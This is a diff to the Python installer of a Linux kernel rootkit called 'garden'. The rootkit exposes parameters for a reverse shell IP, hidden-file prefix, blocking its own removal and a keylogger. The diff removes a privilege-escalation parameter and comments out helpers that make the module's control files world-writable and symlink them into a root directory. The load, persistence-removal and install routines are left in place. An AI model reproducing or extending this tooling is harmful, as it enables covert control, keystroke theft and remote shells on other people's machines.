@@ -12,7 +12,7 @@ from subprocess import STDOUT, PIPE, CalledProcessError, check_output, Popen
 #######
 
 # These must be identical to the parameters declared in rootkit/rootkit.c
-MODULE_PARAMS = ["rev_shell_ip", "hidden_file_prefix", "escalate_privileges", "block_removal", "keylogger"]
+MODULE_PARAMS = ["rev_shell_ip", "hidden_file_prefix", "block_removal", "keylogger"]
 
 #######
 # Prompting/Printing
@@ -216,31 +216,31 @@ def get_all_param_files(driver_name, module_params):
 	return ["/sys/module/{}/parameters/{}".format(driver_name, param) for param in module_params]
 
 
-def update_permissions(driver_name):
-	"""
-	Makes it so that all kernel module parameter files can be written
-	to by any user.
-	"""
-	for file in get_all_param_files(driver_name, MODULE_PARAMS):
-		os.chmod(file, 0o777)
+# def update_permissions(driver_name):
+# 	"""
+# 	Makes it so that all kernel module parameter files can be written
+# 	to by any user.
+# 	"""
+# 	for file in get_all_param_files(driver_name, MODULE_PARAMS):
+# 		os.chmod(file, 0o777)
 
 
-def symlink_command_files(driver_name):
-	"""
-	Creates symlinks from all module parameter files to dest_dir/<PARAM>.
-	This lets us shorten a command from:
-	$ echo "$IP > /sys/module/garden/parameters/reverse_shell_ip
-	to $ echo "$IP > /garden/reverse_shell_ip
-	"""
-	dest_path = "/" + driver_name
-	if not os.path.isdir(dest_path):
-		os.mkdir(dest_path)
-
-	for source_param_file in get_all_param_files(driver_name, MODULE_PARAMS):
-		param_name = source_param_file.split("/")[-1]
-		symlink_file = "{}/{}".format(dest_path, param_name)
-		if not os.path.islink(symlink_file):
-			os.symlink(source_param_file, symlink_file)
+# def symlink_command_files(driver_name):
+# 	"""
+# 	Creates symlinks from all module parameter files to dest_dir/<PARAM>.
+# 	This lets us shorten a command from:
+# 	$ echo "$IP > /sys/module/garden/parameters/reverse_shell_ip
+# 	to $ echo "$IP > /garden/reverse_shell_ip
+# 	"""
+# 	dest_path = "/" + driver_name
+# 	if not os.path.isdir(dest_path):
+# 		os.mkdir(dest_path)
+#
+# 	for source_param_file in get_all_param_files(driver_name, MODULE_PARAMS):
+# 		param_name = source_param_file.split("/")[-1]
+# 		symlink_file = "{}/{}".format(dest_path, param_name)
+# 		if not os.path.islink(symlink_file):
+# 			os.symlink(source_param_file, symlink_file)
 
 
 def cleanup_command_files(driver_name):
@@ -338,8 +338,8 @@ def install(kernel_version):
 	# Unload kernel module if it's already loaded and load new module.
 	unload_module(config["MODULE_NAME"])
 	load_module(module_dest_path, config)
-	update_permissions(driver_name)
-	symlink_command_files(config["MODULE_NAME"])
+	# update_permissions(driver_name)
+	# symlink_command_files(config["MODULE_NAME"])
 	print_success("Successful installation.")
 
 
@@ -350,7 +350,7 @@ def uninstall():
 	print_status("Starting rootkit removal...")
 	module = prompt("Enter the name of the module to remove.", "garden")
 	remove_persistence(module)
-	cleanup_command_files(module)
+	# cleanup_command_files(module)
 	unload_module(module)
 	print_success("Removed {} from modules.".format(module))
 
